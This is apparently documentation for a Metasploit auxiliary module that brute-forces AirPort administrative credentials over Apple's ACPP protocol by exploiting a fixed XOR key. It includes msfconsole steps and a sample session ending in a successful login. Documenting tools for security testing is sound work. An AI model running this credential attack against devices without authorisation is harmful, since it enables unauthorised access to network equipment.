## Vulnerable Application

ACPP is an undocumented and proprietary Apple protocol found in Airport products which protects the credentials used to administer the device. This module attempts exploit a weak encryption mechanism (fixed XOR key) by brute forcing the password via a dictionary attack or specific password.

More information can be found on the Rapid7 Vulnerability & Exploit Database page (https://www.rapid7.com/db/modules/auxiliary/scanner/acpp/login)

## Verification Steps

  1. Start msfconsole
  2. Do: `use auxiliary/scanner/acpp/login`
  3. Do: `show options`
      ...show and set options...
  4. Do: `run`

## Scenarios

  ```
  msf > use auxiliary/scanner/acpp/login
  msf auxiliary(scanner/acpp/login) > show options
  msf auxiliary(scanner/acpp/login) > set RHOSTS 1.1.1.1
      RHOSTS => 1.1.1.1
  msf auxiliary(scanner/acpp/login) > set PASSWORD myPassword
      PASSWORD => myPassword
  msf auxiliary(scanner/acpp/login) > run
    [*] 1.1.1.1:5009 - 1.1.1.1:5009 - Starting ACPP login sweep
    [*] 1.1.1.1:5009 - 1.1.1.1:5009 - ACPP Login Successful: myPassword
  ```
